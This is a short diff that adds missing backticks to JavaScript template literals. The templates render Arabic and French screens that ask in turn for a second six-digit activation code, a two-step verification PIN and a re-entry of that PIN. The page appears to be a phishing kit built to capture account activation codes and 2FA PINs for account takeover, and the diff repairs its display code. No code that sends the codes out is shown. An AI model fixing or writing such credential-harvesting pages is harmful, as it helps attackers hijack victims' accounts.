@@ -10,13 +10,13 @@ function submitFirstActivationCode() {
 
             startCountdown(() => {
                 const container = document.getElementById('container');
-                container.innerHTML = 
+                container.innerHTML = `
                     <h1>رمز التفعيل الثاني</h1>
                     <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
                     <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
-                ;
+                `;
             });
         }
 
@@ -32,7 +32,7 @@ function submitFirstActivationCode() {
 
             startCountdown(() => {
                 const container = document.getElementById('container');
-                container.innerHTML = 
+                container.innerHTML = `
                     <h1>Vérification en deux étapes</h1>
                     <p>Saisissez le code PIN que vous avez créé lors de la configuration de la vérification en deux étapes.</p>
                     <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
@@ -42,7 +42,7 @@ function submitFirstActivationCode() {
                     </p>
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
-                ;
+                `;
             });
         }
 
@@ -58,13 +58,13 @@ function submitFirstActivationCode() {
 
             startCountdown(() => {
                 const container = document.getElementById('container');
-                container.innerHTML = 
+                container.innerHTML = `
                     <h1>إعادة رمز PIN</h1>
                     <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
                     <input id="pinCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondPin()">متابعة</button>
                     <div id="countdown"></div>
-                ;
+                `;
             });
         }
 
